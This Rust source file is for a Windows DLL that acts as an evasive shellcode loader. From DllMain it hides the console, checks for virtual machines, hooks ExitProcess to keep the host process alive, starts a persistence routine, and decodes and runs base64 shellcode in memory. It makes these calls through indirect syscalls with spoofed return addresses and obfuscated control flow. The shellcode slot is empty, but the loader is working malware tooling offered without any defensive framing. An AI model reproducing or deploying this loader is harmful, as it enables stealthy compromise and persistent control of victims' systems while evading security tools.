#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
use std::arch::global_asm;
use windows::Win32::Foundation::{BOOL, HINSTANCE};
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
use base64::{Engine as _, engine::general_purpose};
use obfuscator::{obfuscate, obfuscate_string};
mod syscall;
mod anti_analysis;
use syscall::{get_syscall_info, get_module_base, get_export_address, find_ret_gadget, SyscallInfo};
static mut ORIGINAL_EXIT_PROCESS: usize = 0;
#[no_mangle]
static mut NTDLL_RET_GADGET: *mut core::ffi::c_void = std::ptr::null_mut();
#[no_mangle]
static mut KERNEL32_RET_ADDR: *mut core::ffi::c_void = std::ptr::null_mut();
global_asm!(r#"
.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r11, [rsp + 0x38]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11
    mov r11, [rsp + 0x40]
    mov [rsp + 0x30], r11

    mov r11, [rsp + 0x48]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_protect_virtual_memory
asm_nt_protect_virtual_memory:
    mov r11, [rsp + 0x30]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11

    mov r11, [rsp + 0x40]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r11, [rsp + 0x30]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11

    mov r11, [rsp + 0x40]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r11, [rsp + 0x60]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11
    mov r11, [rsp + 0x40]
    mov [rsp + 0x30], r11
    mov r11, [rsp + 0x48]
    mov [rsp + 0x38], r11
    mov r11, [rsp + 0x50]
    mov [rsp + 0x40], r11
    mov r11, [rsp + 0x58]
    mov [rsp + 0x48], r11
    mov r11, [rsp + 0x60]     
    mov [rsp + 0x50], r11
    mov r11, [rsp + 0x68]
    mov [rsp + 0x58], r11

    mov r11, [rsp + 0x70]
    mov r11, [r11 + 8]
    jmp r11

asm_nt_create_event:
    mov r11, [rsp + 0x30]
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, [rsp + 0x38]
    mov [rsp + 0x28], r11

    mov r11, [rsp + 0x40]
    mov r11, [r11 + 8]
    jmp r11

.global asm_nt_wait_for_single_object
asm_nt_wait_for_single_object:
    mov r11, r9
    mov r10, rcx
    mov eax, [r11]           

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11


    mov r11, [rsp + 0x28]
   
    mov r11, r9
    mov r11, [r11 + 8]
    jmp r11
	
.global asm_nt_user_show_window
asm_nt_user_show_window:
    mov r11, r8
    mov r10, rcx
    mov eax, [r11]

    mov r11, [rip + NTDLL_RET_GADGET]
    push r11
    mov r11, [rip + KERNEL32_RET_ADDR]
    push r11

    mov r11, r8
    mov r11, [r11 + 8]
    jmp r11
"#);

extern "C" {
    fn asm_nt_allocate_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: &mut *mut std::ffi::c_void,
        ZeroBits: usize,
        RegionSize: &mut usize,
        AllocationType: u32,
        Protect: u32,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;
    fn asm_nt_protect_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: &mut *mut std::ffi::c_void,
        NumberOfBytesToProtect: &mut usize,
        NewAccessProtection: u32,
        OldAccessProtection: &mut u32,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;
    fn asm_nt_write_virtual_memory(
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        BaseAddress: *mut std::ffi::c_void,
        Buffer: *const std::ffi::c_void,
        NumberOfBytesToWrite: usize,
        NumberOfBytesWritten: &mut usize,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;
    fn asm_nt_create_thread_ex(
        ThreadHandle: &mut windows_sys::Win32::Foundation::HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut std::ffi::c_void,
        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
        StartRoutine: *mut std::ffi::c_void,
        Argument: *mut std::ffi::c_void,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: *mut std::ffi::c_void,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;
    fn asm_nt_create_event(
        EventHandle: &mut windows_sys::Win32::Foundation::HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut std::ffi::c_void,
        EventType: u32,
        InitialState: u8,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;
    fn asm_nt_wait_for_single_object(
        Handle: windows_sys::Win32::Foundation::HANDLE,
        Alertable: u8,
        Timeout: *mut i64,
        info: &SyscallInfo,
    ) -> windows_sys::Win32::Foundation::NTSTATUS;
    fn asm_nt_user_show_window(
        hwnd: windows::Win32::Foundation::HWND,
        n_cmd_show: u32,
        info: &SyscallInfo,
    ) -> windows::Win32::Foundation::BOOL;
}

macro_rules! export_function {
    ($name:ident) => {
        #[no_mangle]
        pub extern "system" fn $name() {}
    };
}
#[obfuscate(garbage=true, control_f=true, arithmetic=false)]
unsafe fn init_gadgets() -> Option<()> {
    let ntdll_base = get_module_base("ntdll.dll")?;
    let kernel32_base = get_module_base("kernel32.dll")?;
    NTDLL_RET_GADGET = find_ret_gadget(ntdll_base)?;
    KERNEL32_RET_ADDR = find_ret_gadget(kernel32_base)?;
    Some(())
}
unsafe fn hook_exit_process() {
    if let (Some(kernel32_base), Some(nt_protect_info), Some(nt_write_info)) = (
        get_module_base("kernel32.dll"),
        get_syscall_info("ntdll.dll", "NtProtectVirtualMemory"),
        get_syscall_info("ntdll.dll", "NtWriteVirtualMemory"),
    ) {
        if let Some(exit_proc_addr) = get_export_address(kernel32_base, "ExitProcess") {
            let exit_proc_ptr = exit_proc_addr as *mut u8;
            ORIGINAL_EXIT_PROCESS = exit_proc_ptr as usize;

            let mut base_address = exit_proc_ptr as *mut std::ffi::c_void;
            let mut region_size = 12usize;
            let mut old_protect = 0u32;

            asm_nt_protect_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                &mut base_address,
                &mut region_size,
                0x04,
                &mut old_protect,
                &nt_protect_info,
            );

            let hook_addr = fake_exit_process as usize;
            let patch: [u8; 12] = [
                0x48, 0xB8,
                (hook_addr & 0xFF) as u8,
                ((hook_addr >> 8) & 0xFF) as u8,
                ((hook_addr >> 16) & 0xFF) as u8,
                ((hook_addr >> 24) & 0xFF) as u8,
                ((hook_addr >> 32) & 0xFF) as u8,
                ((hook_addr >> 40) & 0xFF) as u8,
                ((hook_addr >> 48) & 0xFF) as u8,
                ((hook_addr >> 56) & 0xFF) as u8,
                0xFF, 0xE0,
            ];

            let mut bytes_written = 0usize;
            asm_nt_write_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                exit_proc_ptr as *mut std::ffi::c_void,
                patch.as_ptr() as *const std::ffi::c_void,
                patch.len(),
                &mut bytes_written,
                &nt_write_info,
            );

            asm_nt_protect_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                &mut base_address,
                &mut region_size,
                old_protect,
                &mut old_protect,
                &nt_protect_info,
            );
        }
    }
}
unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
    if let (Some(nt_create_event_info), Some(nt_wait_info)) = (
        get_syscall_info("ntdll.dll", "NtCreateEvent"),
        get_syscall_info("ntdll.dll", "NtWaitForSingleObject"),
    ) {
        let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
        asm_nt_create_event(
            &mut event_handle,
            0x1F0003,
            std::ptr::null_mut(),
            1,
            0,
            &nt_create_event_info,
        );

        if event_handle != 0 {
            asm_nt_wait_for_single_object(
                event_handle,
                0,
                std::ptr::null_mut(),
                &nt_wait_info,
            );
        }
    }
    loop { std::thread::sleep(std::time::Duration::from_secs(60)); }
}

fn get_shellcode() -> String {
    [
        "",		
    ].concat()
}
#[obfuscate(garbage=true, control_f=true, arithmetic=false)]
unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
	if anti_analysis::is_virtualized() {
        return 0;
    }
	let ENCODED_SHELLCODE = get_shellcode();	
    if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
        if let (Some(nt_alloc_info), Some(nt_write_info), Some(nt_protect_info)) = (
            get_syscall_info("ntdll.dll", "NtAllocateVirtualMemory"),
            get_syscall_info("ntdll.dll", "NtWriteVirtualMemory"),
            get_syscall_info("ntdll.dll", "NtProtectVirtualMemory"),
        ) {
            let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
            let mut region_size = shellcode.len();

            let status = asm_nt_allocate_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                &mut exec_mem,
                0,
                &mut region_size,
                0x3000,
                0x04,
                &nt_alloc_info,
            );

            if status == 0 && !exec_mem.is_null() {
                let mut bytes_written = 0usize;
                asm_nt_write_virtual_memory(
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    exec_mem,
                    shellcode.as_ptr() as *const std::ffi::c_void,
                    shellcode.len(),
                    &mut bytes_written,
                    &nt_write_info,
                );

                let mut old_protect = 0u32;
                let mut protect_size = shellcode.len();
                let mut protect_base = exec_mem;
                asm_nt_protect_virtual_memory(
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    &mut protect_base,
                    &mut protect_size,
                    0x20,
                    &mut old_protect,
                    &nt_protect_info,
                );

                let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
                exec_fn();
            }
        }
    }
    0
}
#[obfuscate(garbage=true, control_f=true, arithmetic=false)]
unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 {
    loop {
        if let Some(kernel32_base) = get_module_base("kernel32.dll") {
            if let Some(get_console_window_addr) = get_export_address(kernel32_base, "GetConsoleWindow") {
                let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
                let hwnd = get_console_window();
                if hwnd.0 != 0 {
                    if let Some(nt_show_window_info) = get_syscall_info("win32u.dll", "NtUserShowWindow") {
                        asm_nt_user_show_window(hwnd, 0, &nt_show_window_info); // SW_HIDE = 0
                        break;
                    }
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    0
}
mod pre;
#[obfuscate(garbage=true, control_f=true, arithmetic=false)]
unsafe extern "system" fn persistence_thread(_lp_param: *mut std::ffi::c_void) -> u32 {
    if anti_analysis::is_virtualized() {
        return 0;
    }

    let _ = pre::setup_persistence();

    0
}
#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: HINSTANCE,
    fdw_reason: u32,
    _lp_reserved: *mut core::ffi::c_void,
) -> BOOL {
    if fdw_reason == DLL_PROCESS_ATTACH {
        unsafe {
            if init_gadgets().is_none() {
                return BOOL(1);
            }

            hook_exit_process();

            if let Some(nt_create_thread_info) = get_syscall_info("ntdll.dll", "NtCreateThreadEx") {
                let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
                				
				asm_nt_create_thread_ex(
                    &mut thread_handle,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    hide_console_thread as *mut std::ffi::c_void,
                    std::ptr::null_mut(),
                    0, 0, 0, 0,
                    std::ptr::null_mut(),
                    &nt_create_thread_info,
                );
				
				if anti_analysis::is_virtualized() {
					return BOOL(0);
				}
				
				asm_nt_create_thread_ex(
                    &mut thread_handle,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    persistence_thread as *mut std::ffi::c_void,
                    std::ptr::null_mut(),
                    0, 0, 0, 0,
                    std::ptr::null_mut(),
                    &nt_create_thread_info,
                );

                asm_nt_create_thread_ex(
                    &mut thread_handle,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    shellcode_thread as *mut std::ffi::c_void,
                    std::ptr::null_mut(),
                    0, 0, 0, 0,
                    std::ptr::null_mut(),
                    &nt_create_thread_info,
                );
            }
        }
    }
    BOOL(1)
}
